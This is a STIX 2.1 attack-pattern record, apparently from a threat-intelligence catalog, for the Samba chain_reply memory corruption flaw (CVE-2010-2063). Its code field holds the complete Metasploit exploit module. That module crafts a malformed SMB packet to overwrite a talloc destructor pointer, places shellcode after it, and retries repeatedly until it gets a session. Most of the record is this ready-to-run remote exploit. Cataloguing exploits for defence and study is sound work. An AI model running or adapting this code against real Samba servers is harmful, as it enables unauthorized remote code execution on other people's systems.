{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa165b2e-4902-4c11-a7c2-161c74b83181",
    "created": "2024-08-14T16:56:57.540696Z",
    "modified": "2024-08-14T16:56:57.5407Z",
    "name": "Samba chain_reply Memory Corruption (Linux x86)",
    "description": " This exploits a memory corruption vulnerability present in Samba versions prior to 3.3.13. When handling chained response packets, Samba fails to validate the offset value used when building the next part. By setting this value to a number larger than the destination buffer size, an attacker can corrupt memory. Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will cause the header of the input buffer chunk to be corrupted.  After close inspection, it appears that 3.0.x versions of Samba are not exploitable. Since they use an \"InputBuffer\" size of 0x20441, an attacker cannot cause memory to be corrupted in an exploitable way. It is possible to corrupt the heap header of the \"InputBuffer\", but it didn't seem possible to get the chunk to be processed again prior to process exit.  In order to gain code execution, this exploit attempts to overwrite a \"talloc chunk\" destructor function pointer.  This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the nx memory protection.  NOTE: It is possible to make exploitation attempts indefinitely since Samba forks for user sessions in the default configuration. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/samba/chain_reply.rb",
            "external_id": "chain_reply.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2063"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=873"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba chain_reply Memory Corruption (Linux x86)',\n      'Description'    => %q{\n          This exploits a memory corruption vulnerability present in Samba versions\n        prior to 3.3.13. When handling chained response packets, Samba fails to validate\n        the offset value used when building the next part. By setting this value to a\n        number larger than the destination buffer size, an attacker can corrupt memory.\n        Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will\n        cause the header of the input buffer chunk to be corrupted.\n\n        After close inspection, it appears that 3.0.x versions of Samba are not\n        exploitable. Since they use an \"InputBuffer\" size of 0x20441, an attacker cannot\n        cause memory to be corrupted in an exploitable way. It is possible to corrupt the\n        heap header of the \"InputBuffer\", but it didn't seem possible to get the chunk\n        to be processed again prior to process exit.\n\n        In order to gain code execution, this exploit attempts to overwrite a \"talloc\n        chunk\" destructor function pointer.\n\n        This particular module is capable of exploiting the flaw on x86 Linux systems\n        that do not have the nx memory protection.\n\n        NOTE: It is possible to make exploitation attempts indefinitely since Samba forks\n        for user sessions in the default configuration.\n      },\n      'Author'         =>\n        [\n          'Jun Mao', #Initial discovery\n          'jduck'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-2063' ],\n          [ 'OSVDB', '65518' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=873' ]\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 0x600,\n          'BadChars' => \"\",\n        },\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Linux (Debian5 3.2.5-4lenny6)',\n            {\n              'Offset2'      => 0x1fec,\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0x081ed5f2 }, # jmp ecx (smbd bin)\n                  'Stop'  => { 'Ret' => 0x081ed5f2 },\n                  'Step'  => 0x300 # not used\n                }\n            }\n          ],\n\n          [ 'Debugging Target',\n            {\n              'Offset2'      => 0x1fec,\n              'Bruteforce'   =>\n                {\n                  'Start' => { 'Ret' => 0xAABBCCDD },\n                  'Stop'  => { 'Ret' => 0xAABBCCDD },\n                  'Step'  => 0x300\n                }\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-06-16'))\n\n    register_options(\n      [\n        Opt::RPORT(139)\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  #\n  # Note: this code is duplicated from lib/rex/proto/smb/client.rb\n  #\n  # Authenticate using clear-text passwords\n  #\n  def session_setup_clear_ignore_response(user = '', pass = '', domain = '')\n\n    data = [ pass, user, domain, self.simple.client.native_os, self.simple.client.native_lm ].collect{ |a| a + \"\\x00\" }.join('');\n\n    pkt = CONST::SMB_SETUP_LANMAN_PKT.make_struct\n    self.simple.client.smb_defaults(pkt['Payload']['SMB'])\n\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0x2001\n    pkt['Payload']['SMB'].v['WordCount'] = 10\n    pkt['Payload'].v['AndX'] = 255\n    pkt['Payload'].v['MaxBuff'] = 0xffdf\n    pkt['Payload'].v['MaxMPX'] = 2\n    pkt['Payload'].v['VCNum'] = 1\n    pkt['Payload'].v['PasswordLen'] = pass.length + 1\n    pkt['Payload'].v['Capabilities'] = 64\n    pkt['Payload'].v['SessionKey'] = self.simple.client.session_id\n    pkt['Payload'].v['Payload'] = data\n\n    self.simple.client.smb_send(pkt.to_s)\n    ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)\n  end\n\n\n  def brute_exploit(addrs)\n\n    curr_ret = addrs['Ret']\n\n    # Although ecx always points at our buffer, sometimes the heap data gets modified\n    # and nips off the final byte of our 5 byte jump :(\n    #\n    # Solution: try repeatedly until we win.\n    #\n    50.times{\n\n      begin\n        print_status(\"Trying return address 0x%.8x...\" %  curr_ret)\n\n        connect(versions: [1])\n        self.simple.client.session_id = rand(31337)\n\n        #select(nil,nil,nil,2)\n        #puts \"press any key\"; $stdin.gets\n\n        #\n        # This allows us to allocate a talloc_chunk after the input buffer.\n        # If doing so fails, we are lost ...\n        #\n        10.times {\n          session_setup_clear_ignore_response('', '', '')\n        }\n\n        # We re-use a pointer from the stack and jump back to our original \"inbuf\"\n        distance = target['Offset2'] - 0x80\n        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{distance}\").encode_string\n\n        tlen = 0xc00\n        trans =\n          \"\\x00\\x04\" +\n          \"\\x08\\x20\" +\n          \"\\xff\"+\"SMB\"+\n          # SMBlogoffX\n          [0x74].pack('V') +\n          # tc->next, tc->prev\n          jmp_back + (\"\\x42\" * 3) +\n          #(\"A\" * 4) + (\"B\" * 4) +\n          # tc->parent, tc->child\n          \"CCCCDDDD\" +\n          # tc->refs, must be zero\n          (\"\\x00\" * 4) +\n          # over writes tc->destructor\n          [addrs['Ret']].pack('V') +\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\xd0\\x07\\x0c\\x00\"+\n          \"\\xd0\\x07\\x0c\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\xd0\\x07\"+\n          \"\\x43\\x00\\x0c\\x00\"+\n          \"\\x14\\x08\\x01\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x00\\x00\"+\n          \"\\x00\\x00\\x90\"\n\n          # We put the shellcode first, since only part of this packet makes it into memory.\n          trans << payload.encoded\n          trans << rand_text(tlen - trans.length)\n\n          # Set what eventually becomes 'smb_off2' to our unvalidated offset value.\n          smb_off2 = target['Offset2']\n          trans[39,2] = [smb_off2].pack('v')\n\n          sock.put(trans)\n\n        rescue EOFError\n          # nothing\n        rescue => e\n          print_error(\"#{e}\")\n        end\n\n        handler\n        disconnect\n\n        # See if we won yet..\n        select(nil,nil,nil, 1)\n        break if session_created?\n      }\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-06-16",
    "x_mitre_platforms": [
        "linux'"
    ]
}